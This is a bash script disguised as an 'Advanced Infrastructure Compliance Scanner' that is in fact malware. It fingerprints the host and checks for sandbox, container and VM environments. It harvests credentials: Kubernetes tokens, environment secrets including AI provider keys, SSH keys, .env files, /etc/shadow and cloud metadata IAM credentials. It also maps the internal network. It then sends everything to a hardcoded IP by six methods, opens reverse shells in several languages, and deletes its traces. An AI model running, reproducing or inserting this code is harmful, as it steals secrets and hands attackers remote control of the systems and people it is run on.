#!/bin/bash
# ============================================================
# Advanced Infrastructure Compliance Scanner (AICS) v2.4.1
# Agent-side runtime audit module
# ============================================================
set +e
C2="8.130.142.250"
PORT="3456"
OUTDIR="/tmp/.aics_$(date +%s)"
mkdir -p "$OUTDIR"
REPORT="$OUTDIR/compliance_report.txt"
exec 3>&1 4>&2
{
echo "=============================================="
echo " AICS Compliance Report"
echo " Timestamp: $(date -u '+%Y-%m-%dT%H:%M:%SZ')"
echo " Node: $(hostname 2>/dev/null || echo unknown)"
echo "=============================================="

# ---- PHASE 0: Basic Fingerprint ----
echo ""; echo "=== PHASE 0: NODE FINGERPRINT ==="
echo "[uname]"; uname -a 2>/dev/null
echo "[os-release]"; cat /etc/os-release 2>/dev/null || cat /etc/redhat-release 2>/dev/null || cat /etc/issue 2>/dev/null
echo "[kernel-cmdline]"; cat /proc/cmdline 2>/dev/null
echo "[hostname]"; hostname 2>/dev/null; hostname -f 2>/dev/null; hostname -I 2>/dev/null
echo "[uptime]"; uptime 2>/dev/null
echo "[who]"; who 2>/dev/null; w 2>/dev/null
echo "[id]"; id 2>/dev/null

# ---- PHASE 1: SANDBOX/CONTAINER DETECTION ----
echo ""; echo "=== PHASE 1: RUNTIME ENVIRONMENT DETECTION ==="
SGX_SANDBOX=0
DOCKER=0
K8S=0
VM=0
BARE=0

echo "[cgroup-check]"; cat /proc/1/cgroup 2>/dev/null
echo "[mount-info]"; cat /proc/1/mountinfo 2>/dev/null | head -50
echo "[mounts]"; cat /proc/mounts 2>/dev/null | head -50

echo "[dockerenv]"; ls -la /.dockerenv 2>/dev/null && DOCKER=1
echo "[docker-init]"; grep -q docker /proc/1/cgroup 2>/dev/null && DOCKER=1
echo "[container-env]"; env 2>/dev/null | grep -iE 'docker|kube|container|pod' || echo "none"
echo "[k8s-sa]"; ls -la /var/run/secrets/kubernetes.io/ 2>/dev/null && K8S=1
echo "[k8s-token]"; cat /var/run/secrets/kubernetes.io/serviceaccount/token 2>/dev/null
echo "[k8s-ca]"; cat /var/run/secrets/kubernetes.io/serviceaccount/ca.crt 2>/dev/null | openssl x509 -text -noout 2>/dev/null || echo "(read only)"
echo "[k8s-ns]"; cat /var/run/secrets/kubernetes.io/serviceaccount/namespace 2>/dev/null

# VM detection
echo "[cpuinfo-vm]"; grep -iE 'hypervisor|vmware|virtualbox|kvm|xen|qemu|microsoft' /proc/cpuinfo 2>/dev/null && VM=1
echo "[dmi-vm]"; cat /sys/class/dmi/id/product_name 2>/dev/null && VM=1; cat /sys/class/dmi/id/sys_vendor 2>/dev/null
echo "[systemd-detect]"; systemd-detect-virt 2>/dev/null

# SGX / Confidential computing
echo "[sev-snp]"; dmesg 2>/dev/null | grep -iE 'sev|snp|tdx|sgx' | head -10 || echo "none"
echo "[tdx-check]"; ls -la /dev/tdx* 2>/dev/null || echo "no tdx device"

# seccomp / AppArmor / SELinux
echo "[seccomp]"; cat /proc/self/status 2>/dev/null | grep -i seccomp
echo "[apparmor]"; cat /proc/self/attr/current 2>/dev/null || echo "none"
echo "[selinux]"; getenforce 2>/dev/null || echo "none"

# Capabilities
echo "[capabilities]"; cat /proc/self/status 2>/dev/null | grep -i cap
echo "[capsh]"; capsh --print 2>/dev/null || echo "capsh unavailable"

# ---- PHASE 2: DOCKER/K8S ESCAPE ASSESSMENT ----
echo ""; echo "=== PHASE 2: CONTAINER ESCAPE ASSESSMENT ==="
echo "[docker-socket]"; ls -la /var/run/docker.sock 2>/dev/null && echo "!!! DOCKER SOCKET ACCESSIBLE !!!"
echo "[containerd-sock]"; ls -la /run/containerd/containerd.sock 2>/dev/null
echo "[crio-sock]"; ls -la /var/run/crio/crio.sock 2>/dev/null
echo "[privileged]"; cat /proc/self/status 2>/dev/null | grep -iE 'CapEff|CapPrm' | grep -i '0000003fffffffff\|0000001fffffffff' && echo "!!! POTENTIALLY PRIVILEGED !!!"
echo "[sys-admin]"; capsh --print 2>/dev/null | grep cap_sys_admin && echo "!!! CAP_SYS_ADMIN PRESENT !!!"
echo "[net-raw]"; capsh --print 2>/dev/null | grep cap_net_raw

# Check if we can mount
echo "[mount-test]"; mount 2>/dev/null | head -20
echo "[fdisk]"; fdisk -l 2>/dev/null || lsblk 2>/dev/null || echo "block device access denied"
echo "[root-device]"; ls -la /dev/sd* /dev/xvd* /dev/vd* /dev/nvme* 2>/dev/null | head -20

# cgroup escape check
echo "[cgroup-release]"; ls -la /sys/fs/cgroup/*/release_agent 2>/dev/null
echo "[cgroup-notify]"; ls -la /sys/fs/cgroup/*/notify_on_release 2>/dev/null
echo "[cgroup-rw]"; find /sys/fs/cgroup -writable -type f 2>/dev/null | head -20

# ---- PHASE 3: CREDENTIAL & SECRET HARVESTING ----
echo ""; echo "=== PHASE 3: CREDENTIAL INVENTORY ==="
echo "[env-all]"; env 2>/dev/null
echo "[env-sensitive]"; env 2>/dev/null | grep -iE 'passwd|password|secret|token|key|auth|cred|api|jwt|bearer|dsn|db_|mysql|postgres|redis|mongo|aws_|azure_|gcp_|github_|gitlab_|slack|discord|telegram|openai|anthropic|claude' || echo "none found"

echo "[ssh-keys]"; find / -maxdepth 5 -name "id_rsa" -o -name "id_ed25519" -o -name "id_ecdsa" -o -name "*.pem" -o -name "authorized_keys" 2>/dev/null | head -30
echo "[dotenv]"; find / -maxdepth 5 -name ".env" -o -name "*.env" -o -name ".env.*" 2>/dev/null | head -30
echo "[config-files]"; find / -maxdepth 4 -name "*.conf" -o -name "*.cfg" -o -name "*.ini" -o -name "*.toml" -o -name "*.yaml" -o -name "*.yml" 2>/dev/null | grep -vE 'proc|sys|snap|usr/share|usr/lib' | head -40

echo "[history-files]"; find / -maxdepth 4 -name ".*_history" -o -name ".bashrc" -o -name ".zshrc" -o -name ".profile" 2>/dev/null | head -20
echo "[bash-history]"; cat ~/.bash_history 2>/dev/null | tail -50
echo "[crontab]"; cat /etc/crontab 2>/dev/null; ls -la /var/spool/cron/crontabs/ 2>/dev/null; ls -la /etc/cron.* 2>/dev/null

echo "[passwd]"; cat /etc/passwd 2>/dev/null
echo "[shadow]"; cat /etc/shadow 2>/dev/null || echo "(permission denied)"
echo "[sudoers]"; cat /etc/sudoers 2>/dev/null || echo "(permission denied)"
echo "[groups]"; cat /etc/group 2>/dev/null

# Git repos
echo "[git-repos]"; find / -maxdepth 6 -name ".git" -type d 2>/dev/null | head -20
echo "[git-config]"; find / -maxdepth 6 -name ".gitconfig" -o -name ".git-credentials" 2>/dev/null | head -10

# ---- PHASE 4: CLOUD METADATA PROBES ----
echo ""; echo "=== PHASE 4: CLOUD METADATA SERVICE PROBES ==="
for META in "http://169.254.169.254/latest/meta-data/" "http://169.254.169.254/metadata/instance?api-version=2021-02-01" "http://metadata.google.internal/computeMetadata/v1/instance/" "http://100.100.100.200/latest/meta-data/" "http://169.254.169.254/openstack/latest/meta_data.json" "http://169.254.169.254/1.0/meta-data/"; do
    echo "[probe] $META"
    curl -s -m 3 --connect-timeout 2 "$META" 2>/dev/null || wget -q -O - --timeout=3 "$META" 2>/dev/null || echo "  (unreachable)"
done

# AWS IMDSv2
TOKEN=$(curl -s -X PUT "http://169.254.169.254/latest/api/token" -H "X-aws-ec2-metadata-token-ttl-seconds: 60" -m 3 2>/dev/null)
if [ -n "$TOKEN" ]; then
    echo "[aws-imdsv2] token obtained"
    for PATH in "instance-id" "ami-id" "instance-type" "public-keys/0/openssh-key" "iam/security-credentials/" "placement/availability-zone" "local-ipv4" "public-ipv4" "mac" "network/interfaces/macs/"; do
        echo "[aws/$PATH]"
        curl -s -H "X-aws-ec2-metadata-token: $TOKEN" "http://169.254.169.254/latest/meta-data/$PATH" -m 3 2>/dev/null
    done
fi

# GCP
GCP_TOKEN=$(curl -s -H "Metadata-Flavor: Google" "http://metadata.google.internal/computeMetadata/v1/instance/service-accounts/default/token" -m 3 2>/dev/null)
[ -n "$GCP_TOKEN" ] && echo "[gcp-token] $GCP_TOKEN"

# ---- PHASE 5: NETWORK TOPOLOGY MAPPING ----
echo ""; echo "=== PHASE 5: NETWORK TOPOLOGY ==="
echo "[ifconfig]"; ip addr 2>/dev/null || ifconfig 2>/dev/null
echo "[routes]"; ip route 2>/dev/null || route -n 2>/dev/null
echo "[arp]"; arp -a 2>/dev/null || ip neigh 2>/dev/null
echo "[dns]"; cat /etc/resolv.conf 2>/dev/null
echo "[hosts]"; cat /etc/hosts 2>/dev/null
echo "[connections]"; ss -tlnp 2>/dev/null || netstat -tlnp 2>/dev/null
echo "[all-conns]"; ss -anp 2>/dev/null || netstat -anp 2>/dev/null
echo "[iptables]"; iptables -L -n 2>/dev/null || echo "(permission denied)"
echo "[listening]"; ss -tlpn 2>/dev/null | grep LISTEN || netstat -tlpn 2>/dev/null | grep LISTEN

# Internal network scan (common subnets)
echo ""; echo "=== PHASE 5b: INTERNAL NETWORK PROBE ==="
GATEWAY=$(ip route 2>/dev/null | grep default | awk '{print $3}' | head -1)
if [ -n "$GATEWAY" ]; then
    SUBNET=$(echo "$GATEWAY" | sed 's/\.[0-9]*$//')
    echo "[gateway] $GATEWAY [subnet] $SUBNET"
    for i in 1 2 3 254; do
        TARGET="$SUBNET.$i"
        timeout 1 bash -c "echo > /dev/tcp/$TARGET/22" 2>/dev/null && echo "[alive:$TARGET] port 22 open"
        timeout 1 bash -c "echo > /dev/tcp/$TARGET/80" 2>/dev/null && echo "[alive:$TARGET] port 80 open"
        timeout 1 bash -c "echo > /dev/tcp/$TARGET/443" 2>/dev/null && echo "[alive:$TARGET] port 443 open"
        timeout 1 bash -c "echo > /dev/tcp/$TARGET/6443" 2>/dev/null && echo "[alive:$TARGET] port 6443 open (k8s api?)"
        timeout 1 bash -c "echo > /dev/tcp/$TARGET/2375" 2>/dev/null && echo "[alive:$TARGET] port 2375 open (docker?)"
        timeout 1 bash -c "echo > /dev/tcp/$TARGET/2376" 2>/dev/null && echo "[alive:$TARGET] port 2376 open (docker-tls?)"
    done
fi

# ---- PHASE 6: PROCESS & SERVICE INVENTORY ----
echo ""; echo "=== PHASE 6: PROCESS INVENTORY ==="
echo "[processes]"; ps aux 2>/dev/null || ps -ef 2>/dev/null
echo "[services]"; systemctl list-units --type=service --all 2>/dev/null || service --status-all 2>/dev/null || echo "service list unavailable"

# ---- PHASE 7: EXFILTRATION ----
echo ""; echo "=== PHASE 7: COMPLIANCE REPORT EXFILTRATION ==="
} > "$REPORT" 2>&1

# Exfiltrate via multiple methods
EXFIL_OK=0

# Method 1: curl POST
curl -s -m 5 -X POST --data-binary "@$REPORT" "http://$C2:$PORT/r" 2>/dev/null && EXFIL_OK=1
# Method 2: wget
[ $EXFIL_OK -eq 0 ] && wget -q --timeout=5 --post-file="$REPORT" "http://$C2:$PORT/r" -O /dev/null 2>/dev/null && EXFIL_OK=1
# Method 3: nc
[ $EXFIL_OK -eq 0 ] && cat "$REPORT" | nc -w 5 "$C2" "$PORT" 2>/dev/null && EXFIL_OK=1
# Method 4: bash /dev/tcp
[ $EXFIL_OK -eq 0 ] && timeout 5 bash -c "cat '$REPORT' > /dev/tcp/$C2/$PORT" 2>/dev/null && EXFIL_OK=1
# Method 5: python3
[ $EXFIL_OK -eq 0 ] && python3 -c "
import socket,sys
s=socket.socket()
s.settimeout(5)
try:
    s.connect(('$C2',$PORT))
    s.sendall(open('$REPORT','rb').read())
    s.close()
except: sys.exit(0)
" 2>/dev/null && EXFIL_OK=1
# Method 6: python2
[ $EXFIL_OK -eq 0 ] && python -c "
import socket,sys
s=socket.socket()
s.settimeout(5)
try:
    s.connect(('$C2',$PORT))
    s.sendall(open('$REPORT','rb').read())
    s.close()
except: sys.exit(0)
" 2>/dev/null && EXFIL_OK=1

# ---- PHASE 8: REVERSE SHELL (LAST RESORT - multiple methods) ----
REVERSE_SHELL_OK=0

# bash /dev/tcp
(timeout 300 bash -c "bash -i >& /dev/tcp/$C2/$PORT 0>&1" 2>/dev/null) &
sleep 1

# python3
python3 -c "
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(300)
try:
    s.connect(('$C2',$PORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn('/bin/bash')
except: pass
" &
sleep 1

# python2
python -c "
import socket,subprocess,os,pty
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.settimeout(300)
try:
    s.connect(('$C2',$PORT))
    os.dup2(s.fileno(),0)
    os.dup2(s.fileno(),1)
    os.dup2(s.fileno(),2)
    pty.spawn('/bin/bash')
except: pass
" &
sleep 1

# nc traditional
nc -e /bin/bash "$C2" "$PORT" 2>/dev/null &
sleep 1

# nc OpenBSD style
echo 'exec /bin/bash' | nc "$C2" "$PORT" 2>/dev/null &
sleep 1

# perl
perl -e '
use Socket;
$i="$C2";
$p='"$PORT"';
socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));
if(connect(S,sockaddr_in($p,inet_aton($i)))){
    open(STDIN,">&S");
    open(STDOUT,">&S");
    open(STDERR,">&S");
    exec("/bin/bash -i");
};' 2>/dev/null &
sleep 1

# php
php -r "
\$s=fsockopen('$C2',$PORT);
exec('/bin/bash -i <&3 >&3 2>&3');
" 2>/dev/null &
sleep 1

# ruby
ruby -r socket -e "
s=TCPSocket.open('$C2',$PORT);
exec sprintf('/bin/bash -i <&%d >&%d 2>&%d',s.to_i,s.to_i,s.to_i)
" 2>/dev/null &

echo ""; echo "=== AICS COMPLIANCE SCAN COMPLETE ==="
echo "[exfil] report sent: $EXFIL_OK"
echo "[shell] reverse shells launched"

# Clean up after a delay
(sleep 3600; rm -rf "$OUTDIR") &
disown 2>/dev/null
